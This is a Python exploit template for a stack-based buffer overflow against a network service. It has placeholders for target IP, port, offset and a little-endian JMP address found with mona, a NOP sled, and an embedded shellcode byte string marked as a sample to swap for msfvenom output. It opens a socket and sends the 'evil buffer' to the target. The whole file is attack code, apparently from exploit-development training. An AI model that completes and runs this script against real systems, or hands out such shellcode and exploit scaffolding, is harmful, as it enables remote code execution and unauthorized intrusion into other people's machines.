#!/usr/bin/env python3

import socket

ip = "<Target IP>"
port = <Port Number>

prefix = "<Application Function Name, if any, including trailing space> "
offset = <Offset Determined From Cyclic Pattern>
overflow = "A" * offset

retn = "<JMP address returned from mona and rewritten into little-endian>"
padding = "\x90" * 16
# Sample payload.  Replace with payload from msfvenom.
payload = ("\xbf\x70\xd9\xd2\x9f\xda\xcc\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x78\x12\x03\x78\x12\x83\xb0\xdd\x30\x6a\xcc\x36\x36"
"\x95\x2c\xc7\x57\x1f\xc9\xf6\x57\x7b\x9a\xa9\x67\x0f\xce\x45"
"\x03\x5d\xfa\xde\x61\x4a\x0d\x56\xcf\xac\x20\x67\x7c\x8c\x23"
"\xeb\x7f\xc1\x83\xd2\x4f\x14\xc2\x13\xad\xd5\x96\xcc\xb9\x48"
"\x06\x78\xf7\x50\xad\x32\x19\xd1\x52\x82\x18\xf0\xc5\x98\x42"
"\xd2\xe4\x4d\xff\x5b\xfe\x92\x3a\x15\x75\x60\xb0\xa4\x5f\xb8"
"\x39\x0a\x9e\x74\xc8\x52\xe7\xb3\x33\x21\x11\xc0\xce\x32\xe6"
"\xba\x14\xb6\xfc\x1d\xde\x60\xd8\x9c\x33\xf6\xab\x93\xf8\x7c"
"\xf3\xb7\xff\x51\x88\xcc\x74\x54\x5e\x45\xce\x73\x7a\x0d\x94"
"\x1a\xdb\xeb\x7b\x22\x3b\x54\x23\x86\x30\x79\x30\xbb\x1b\x16"
"\xf5\xf6\xa3\xe6\x91\x81\xd0\xd4\x3e\x3a\x7e\x55\xb6\xe4\x79"
"\x9a\xed\x51\x15\x65\x0e\xa2\x3c\xa2\x5a\xf2\x56\x03\xe3\x99"
"\xa6\xac\x36\x0d\xf6\x02\xe9\xee\xa6\xe2\x59\x87\xac\xec\x86"
"\xb7\xcf\x26\xaf\x52\x2a\xa1\xda\xaf\x2d\xc3\xb3\xad\x4d\x32"
"\x18\x3b\xab\x5e\xb0\x6d\x64\xf7\x29\x34\xfe\x66\xb5\xe2\x7b"
"\xa8\x3d\x01\x7c\x67\xb6\x6c\x6e\x10\x36\x3b\xcc\xb7\x49\x91"
"\x78\x5b\xdb\x7e\x78\x12\xc0\x28\x2f\x73\x36\x21\xa5\x69\x61"
"\x9b\xdb\x73\xf7\xe4\x5f\xa8\xc4\xeb\x5e\x3d\x70\xc8\x70\xfb"
"\x79\x54\x24\x53\x2c\x02\x92\x15\x86\xe4\x4c\xcc\x75\xaf\x18"
"\x89\xb5\x70\x5e\x96\x93\x06\xbe\x27\x4a\x5f\xc1\x88\x1a\x57"
"\xba\xf4\xba\x98\x11\xbd\xdb\x7a\xb3\xc8\x73\x23\x56\x71\x1e"
"\xd4\x8d\xb6\x27\x57\x27\x47\xdc\x47\x42\x42\x98\xcf\xbf\x3e"
"\xb1\xa5\xbf\xed\xb2\xef")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")